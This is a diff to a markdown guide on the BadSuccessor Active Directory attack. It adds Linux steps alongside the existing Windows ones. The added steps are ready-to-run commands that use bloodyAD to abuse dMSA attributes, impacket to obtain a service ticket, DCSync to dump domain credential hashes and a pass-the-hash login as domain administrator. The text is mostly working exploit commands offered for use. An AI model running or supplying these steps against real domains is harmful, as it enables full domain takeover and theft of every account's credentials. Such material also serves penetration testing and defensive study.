@@ -39,7 +39,9 @@ This attack is particularly dangerous because it allows an attacker with minimal
 
 Unlike attacks that require password cracking or golden ticket creation, BadSuccessor is stealthy, lives entirely within AD’s supported features, and can often bypass detection systems.
 
-## Enumeration and Exploitation
+# Enumeration and Exploitation
+
+## Windows
 
 #### 1) Load BadSuccessor and Check for Vulnerabilities
 
@@ -78,3 +80,41 @@ Unlike attacks that require password cracking or golden ticket creation, BadSucc
 #### 9) Confirm Domain Admin access
 
     dir \\dc.domain.local\c$
+
+## Linux
+
+### 1) Install tools
+
+    curl -LsSf https://astral.sh/uv/install.sh | sh
+
+Then,
+
+    uv tool install --python 3.13 git+https://github.com/CravateRouge/bloodyAD
+
+### 2) Check for any writeable attributes for our user
+
+    bloodyAD -d domain.local -u 'USER' -p 'PASSWORD' --host dc01.domain.local get writeable --detail
+
+### 3) Do the badSuccessor attack
+
+    bloodyAD -d domain.local -u 'USER' -p 'PASSWORD' --host dc01.domain.local add badSuccessor pwned_dmsa
+
+### 4) Save the ccache file generated to the KRB5CCNAME environmental variable
+
+    export KRB5CCNAME=pwned_dmsa_ts.ccache
+
+### 5) Request a new service ticket
+
+    impacket-getST -dc-ip DC_IP -spn 'cifs/dc01.domain.local' 'domain.local/pwned_dmsa$' -k -no-pass
+
+### 6) Save the newly created ccache file
+
+    export KRB5CCNAME=pwned_dmsa$.ccache
+
+### 7) Do DCSync
+
+    impacket-secretsdump -k -no-pass 'pwned_dmsa$'@dc01.domain.local
+
+### 8) Log in as domain admin
+
+    impacket-wmiexec 'domain.local/administrator@DC_IP' -hashes :NTLM_HASH
